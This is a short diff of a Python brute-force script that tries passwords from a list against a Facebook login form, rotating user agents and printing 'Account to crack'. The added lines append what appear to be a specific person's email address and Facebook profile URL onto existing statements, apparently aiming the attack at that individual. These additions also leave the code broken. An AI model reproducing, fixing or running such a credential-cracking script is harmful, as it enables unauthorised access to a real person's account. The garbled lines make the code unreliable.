@@ -39,7 +39,7 @@ def welcome(email, passwordlist):
         with open(passwordlist, "r", encoding="utf-8", errors="ignore") as f:
             total = f.readlines()
         print(wel)
-        print(f" [*] Account to crack : {email}")
+        print(f" [*] Account to crack : {email}")Stacey0421@yahoo.com 
         print(f" [*] Loaded : {len(total)} passwords")
         print(" [*] Cracking, please wait ...\n\n")
     except FileNotFoundError:
@@ -52,7 +52,7 @@ def brute(password, br, email):
     
     br.addheaders = [random.choice(useragents)]
     try:
-        br.open(login_url)
+        br.open(login_url)http://Facebook.com/Stacey.canington 
         br.select_form(nr=0)
         br.form['email'] = email
         br.form['pass'] = password
